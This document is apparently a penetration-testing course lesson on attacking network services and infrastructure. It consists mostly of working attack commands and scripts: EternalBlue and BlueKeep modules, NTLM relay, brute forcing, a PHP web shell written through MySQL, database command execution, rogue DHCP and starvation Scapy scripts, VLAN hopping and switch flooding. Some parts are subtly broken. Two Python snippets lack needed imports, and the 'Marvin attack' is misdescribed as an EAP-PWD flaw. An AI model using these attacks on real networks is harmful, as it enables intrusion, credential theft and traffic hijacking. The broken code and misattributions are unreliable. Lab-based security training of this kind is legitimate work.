# LESSON 5: Network Infrastructure Attacks

## Objective
Master network service exploitation techniques targeting SMB, SSH, FTP, and database services. Learn to identify and exploit common vulnerabilities in network protocols.

## Prerequisites
- Lessons 1-4 completed
- Basic networking knowledge
- Access to vulnerable services (metasploitable VM recommended)

## Phase 1: Service Discovery & Enumeration

### Step 1: Advanced Service Scanning
```bash
# Comprehensive service scan
nmap -sV -sC -p- target_ip

# Service-specific enumeration
nmap --script smb-enum-shares,smb-enum-users target_ip
nmap --script ssh-auth-methods,ssh-hostkey target_ip
nmap --script ftp-anon,ftp-bounce target_ip

# Database service detection
nmap -p 1433,3306,5432,1521 --script ms-sql-info,mysql-info,oracle-sid-brute target_ip
```

### Step 2: Banner Grabbing
```bash
# Telnet banner grab
telnet target_ip port

# Netcat banner grab
nc -nv target_ip port

# Custom banner grabber
echo "" | nc -nv -w1 target_ip port
```

## Phase 2: SMB Exploitation

### Step 3: SMB Enumeration
```bash
# SMB version detection
smbclient -L //target_ip
enum4linux -a target_ip

# Null session enumeration
smbclient //target_ip/share$ -N
rpcclient -U "" -N target_ip

# Share enumeration
smbmap -H target_ip
smbmap -H target_ip -u null -p ""
```

### Step 4: SMB Attacks
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
exploit

# SMB relay attack
responder -I eth0 -rdwv
impacket-ntlmrelayx -tf targets.txt -smb2support

# PSExec attack
psexec.py domain/user:password@target_ip
```

## Phase 3: SSH Exploitation

### Step 5: SSH Enumeration
```bash
# SSH version detection
ssh target_ip
nmap --script ssh2-enum-algos target_ip

# User enumeration (CVE-2018-15473)
python ssh_user_enum.py --port 22 --userList users.txt target_ip

# SSH key discovery
find / -name "id_rsa*" -o -name "id_dsa*" 2>/dev/null
```

### Step 6: SSH Attacks
```bash
# Brute force attack
hydra -L users.txt -P passwords.txt ssh://target_ip

# SSH key attacks
ssh-keygen -f known_hosts -R target_ip
ssh -i stolen_key user@target_ip

# Privilege escalation via SSH
ssh -L 8080:localhost:80 user@target_ip  # Port forwarding
ssh -D 1080 user@target_ip  # SOCKS proxy
```

## Phase 4: FTP Exploitation

### Step 7: FTP Enumeration
```bash
# Anonymous FTP
ftp target_ip
# Use: anonymous / anonymous

# FTP bounce scan
nmap -b ftp-relay:21 target_range

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target_ip
```

### Step 8: FTP Attacks
```bash
# File upload/download
ftp> put shell.php
ftp> get sensitive_file.txt

# Directory traversal
ftp> get ../../../etc/passwd

# FTP command execution
ftp> quote SITE EXEC /bin/bash
```

## Phase 5: Database Exploitation

### Step 9: MySQL Exploitation
```bash
# Connect to MySQL
mysql -h target_ip -u root -p

# Information gathering
mysql> SELECT version();
mysql> SELECT user();
mysql> SHOW DATABASES;
mysql> USE mysql; SELECT user,password FROM user;

# File operations
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/shell.php';

# UDF privilege escalation
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
mysql> SELECT sys_exec('chmod +s /bin/bash');
```

### Step 10: MSSQL Exploitation
```bash
# Connect with impacket
mssqlclient.py sa:password@target_ip

# Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> xp_cmdshell 'whoami';

# Hash extraction
SQL> SELECT name, password_hash FROM sys.sql_logins;
```

### Step 11: PostgreSQL Exploitation
```bash
# Connect to PostgreSQL
psql -h target_ip -U postgres

# Information gathering
postgres=# SELECT version();
postgres=# \l  -- List databases
postgres=# \dt -- List tables

# File operations
postgres=# COPY (SELECT '') TO '/tmp/shell.php';
postgres=# CREATE TABLE cmd(cmd_output text);
postgres=# COPY cmd FROM PROGRAM 'id';
```

## Phase 6: Web Service Exploitation

### Step 12: Apache/Nginx Attacks
```bash
# Directory traversal
curl http://target_ip/../../../etc/passwd
curl http://target_ip/..%2f..%2f..%2fetc%2fpasswd

# Server-side includes
curl "http://target_ip/page.shtml" -H "User-Agent: <!--#exec cmd='id'-->"

# HTTP verb tampering
curl -X OPTIONS http://target_ip
curl -X PUT http://target_ip/shell.php -d @shell.php
```

### Step 13: Application Server Attacks
```bash
# Tomcat exploitation
# Default credentials: admin/admin, tomcat/tomcat
curl -u admin:admin http://target_ip:8080/manager/text/list

# Deploy malicious WAR file
curl -u admin:admin --upload-file shell.war http://target_ip:8080/manager/text/deploy?path=/shell

# JBoss exploitation
curl http://target_ip:8080/jmx-console/
```

## Phase 7: Custom Network Protocols

### Step 14: SNMP Exploitation
```bash
# SNMP enumeration
snmpwalk -c public -v1 target_ip
snmp-check target_ip

# SNMP brute force
onesixtyone -c community.txt target_ip
hydra -P community.txt snmp://target_ip

# Information extraction
snmpwalk -c public -v1 target_ip 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -c public -v1 target_ip 1.3.6.1.2.1.25.4.2.1.2  # Running processes
```

### Step 15: RDP Exploitation
```bash
# RDP enumeration
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 target_ip

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://target_ip
crowbar -b rdp -s target_ip/32 -u admin -C passwords.txt

# BlueKeep exploitation (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target_ip
```

## Phase 8: DHCP Attacks

### Step 16: DHCP Starvation Attack
```bash
# DHCP starvation using Yersinia
yersinia dhcp -attack 1

# DHCP starvation using dhcpstarv
dhcpstarv -i eth0

# Custom DHCP starvation with Scapy
python3 -c "
from scapy.all import *
import random

def dhcp_starve():
    for i in range(254):
        mac = ':'.join(['02'] + ['%02x'%random.randint(0,255) for _ in range(5)])
        discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=mac) / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(sport=68, dport=67) / BOOTP(chaddr=mac) / DHCP(options=[('message-type','discover'), 'end'])
        sendp(discover, iface='eth0', verbose=0)
        print(f'Sent DHCP discover for MAC: {mac}')

dhcp_starve()
"

# Monitor DHCP pool exhaustion
nmap --script broadcast-dhcp-discover
```

### Step 17: Rogue DHCP Server Attack
```bash
# Set up rogue DHCP server with dnsmasq
sudo dnsmasq --no-daemon --listen-address=192.168.1.200 \
             --dhcp-range=192.168.1.50,192.168.1.100,12h \
             --dhcp-option=3,192.168.1.200 \
             --dhcp-option=6,8.8.8.8,192.168.1.200

# Rogue DHCP with custom DNS
sudo dnsmasq --no-daemon --listen-address=192.168.1.200 \
             --dhcp-range=192.168.1.150,192.168.1.200,12h \
             --dhcp-option=3,192.168.1.200 \
             --dhcp-option=6,192.168.1.200 \
             --address=/#/192.168.1.200

# Python rogue DHCP server
python3 -c "
from scapy.all import *
import time

def dhcp_offer(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        
        # Craft malicious DHCP offer
        offer = Ether(dst=client_mac, src=get_if_hwaddr('eth0')) / \
                IP(src='192.168.1.200', dst='255.255.255.255') / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, yiaddr='192.168.1.150', siaddr='192.168.1.200', 
                      giaddr='192.168.1.1', chaddr=client_mac, xid=xid) / \
                DHCP(options=[('message-type', 'offer'),
                             ('server_id', '192.168.1.200'),
                             ('lease_time', 3600),
                             ('subnet_mask', '255.255.255.0'),
                             ('router', '192.168.1.200'),        # Malicious gateway
                             ('name_server', '192.168.1.200'),   # Malicious DNS
                             'end'])
        
        sendp(offer, iface='eth0', verbose=0)
        print(f'Sent malicious DHCP offer to {client_mac}')

sniff(filter='udp and port 67', prn=dhcp_offer, iface='eth0')
"

# DHCP spoofing with Ettercap
ettercap -T -M dhcp:192.168.1.0/24/192.168.1.200/255.255.255.0
```

### Step 18: DHCP Option Injection
```bash
# Malicious DHCP options
# Option 121 - Static routes injection
python3 -c "
from scapy.all import *

# Create malicious route option (Option 121)
# Route 0.0.0.0/0 via attacker IP
malicious_route = b'\x00\x00\x00\x00\x00\xc0\xa8\x01\xc8'  # Route to 192.168.1.200

offer = Ether(dst='ff:ff:ff:ff:ff:ff') / IP(src='192.168.1.200', dst='255.255.255.255') / UDP(sport=67, dport=68) / BOOTP(op=2) / DHCP(options=[('message-type', 'offer'), (121, malicious_route), 'end'])
sendp(offer, iface='eth0')
"

# WPAD injection via DHCP Option 252
# Forces clients to use attacker's proxy
python3 -c "
wpad_url = 'http://192.168.1.200/wpad.dat'
offer = Ether(dst='ff:ff:ff:ff:ff:ff') / IP(src='192.168.1.200', dst='255.255.255.255') / UDP(sport=67, dport=68) / BOOTP(op=2) / DHCP(options=[('message-type', 'offer'), (252, wpad_url), 'end'])
sendp(offer, iface='eth0')
"
```

## Phase 9: Network Access Control (NAC) Bypass

### Step 19: MAC Address Spoofing
```bash
# Identify authorized MAC addresses
nmap -sn 192.168.1.0/24 | grep -E "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}"
arp-scan -l

# Change MAC address
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up

# Permanent MAC change with macchanger
macchanger -m 00:11:22:33:44:55 eth0
macchanger -r eth0  # Random MAC
macchanger -a eth0  # Random vendor MAC

# OUI-specific spoofing (appear as legitimate vendor)
macchanger --mac=00:50:56:XX:XX:XX eth0  # VMware OUI
macchanger --mac=00:0C:29:XX:XX:XX eth0  # VMware OUI
macchanger --mac=08:00:27:XX:XX:XX eth0  # VirtualBox OUI
```

### Step 20: 802.1X Bypass Techniques
```bash
# Hub/switch in the middle attack
# Connect authorized device and attacker machine through hub
# Traffic flows through hub allowing sniffing and injection

# MAC spoofing after authorized logoff
# 1. Wait for authorized user to disconnect
# 2. Quickly change MAC to match authorized user
ifconfig eth0 down
macchanger -m [authorized_mac] eth0
ifconfig eth0 up
dhclient eth0

# EAP-MD5 hash capture and crack
hostapd-wpe wpe.conf  # Capture EAP credentials
john --wordlist=rockyou.txt eap_hashes.txt

# Marvin attack (EAP-PWD vulnerability)
# Exploit timing side-channel in EAP-PWD
python3 marvin_attack.py --interface eth0 --target-ap [BSSID]
```

### Step 21: VLAN Hopping Integration
```bash
# Double tagging attack
# Create packet with two VLAN tags
python3 -c "
from scapy.all import *

# Craft double-tagged packet
pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / \
      Dot1Q(vlan=1) / \
      Dot1Q(vlan=100) / \
      IP(dst='192.168.100.1') / \
      ICMP()

sendp(pkt, iface='eth0')
"

# Switch spoofing (DTP manipulation)
# Force trunk mode on access port
python3 -c "
from scapy.all import *

# Send DTP negotiate packet
dtp = Ether(dst='01:00:0c:cc:cc:cc') / \
      LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
      SNAP(code=0x2004) / \
      DTP(ver=1, type=2, len=5, val=b'\x03')

sendp(dtp, iface='eth0', loop=1, inter=30)
"

# VLAN enumeration after bypass
for vlan in {1..4095}; do
    ping -c 1 192.168.$vlan.1 2>/dev/null && echo "VLAN $vlan active"
done
```

### Step 22: Port Security Bypass
```bash
# CAM table overflow attack
macof -i eth0 -n 10000  # Flood switch with fake MACs

# Sticky MAC bypass
# 1. Disconnect authorized device
# 2. Spoof authorized MAC
# 3. Connect before timeout expires
macchanger -m [sticky_mac] eth0
dhclient eth0

# Port mirroring detection and abuse
# Look for duplicate packets indicating mirroring
python3 -c "
from scapy.all import *

packet_cache = {}

def detect_mirror(pkt):
    pkt_hash = hash(bytes(pkt))
    if pkt_hash in packet_cache:
        print(f'Possible port mirroring detected: duplicate packet')
    packet_cache[pkt_hash] = time.time()

sniff(prn=detect_mirror, iface='eth0', timeout=60)
"
```

## Custom Scripts Usage

### network_scanner.py
```bash
# Comprehensive network service scanner
python3 scripts/lesson_05_network_service/network_scanner.py --target 192.168.1.0/24 --ports 21,22,23,80,443,445,3389
```

### smb_exploit.py
```bash
# SMB exploitation framework
python3 scripts/lesson_05_network_service/smb_exploit.py --target 192.168.1.100 --check-vulns
```

### dhcp_attack.py
```bash
# DHCP starvation and rogue server toolkit
python3 scripts/lesson_05_network_service/dhcp_attack.py --interface eth0 --attack starve
python3 scripts/lesson_05_network_service/dhcp_attack.py --interface eth0 --attack rogue --gateway 192.168.1.200
```

### nac_bypass.py
```bash
# Network Access Control bypass automation
python3 scripts/lesson_05_network_service/nac_bypass.py --interface eth0 --scan-macs
python3 scripts/lesson_05_network_service/nac_bypass.py --interface eth0 --spoof-mac 00:11:22:33:44:55
```

## Evidence Collection

### Step 23: Document Network Exploitation
```bash
# Network topology mapping
nmap -sn target_range > network_map.txt

# Service enumeration results
nmap -sV -sC target_ip > service_enum.txt

# Exploitation proof
echo "$(date): Successfully exploited [service] on [target]" >> network_exploits.log
```

## Success Criteria

✓ SMB shares enumerated and accessed
✓ SSH service compromised
✓ FTP anonymous access achieved
✓ Database service exploited
✓ Web services compromised
✓ SNMP information extracted
✓ DHCP starvation attack successful
✓ Rogue DHCP server established
✓ MAC address spoofing completed
✓ 802.1X bypass achieved
✓ VLAN hopping executed
✓ NAC bypass successful
✓ Network services mapped
✓ Custom scripts functioning

## Defense Recommendations

- Keep services updated
- Disable unnecessary services
- Use strong authentication
- Implement network segmentation
- Monitor service logs
- Use fail2ban for brute force protection
- Regular vulnerability scanning
- Implement DHCP snooping
- Enable port security on switches
- Use 802.1X authentication
- Deploy NAC solutions
- Monitor DHCP lease patterns
- Implement MAC address filtering
- Use VLAN isolation

## Next Lesson Preview
**Lesson 6**: Password Attacks & Cryptography
- Hash cracking techniques
- Rainbow tables and wordlists
- Cryptographic attacks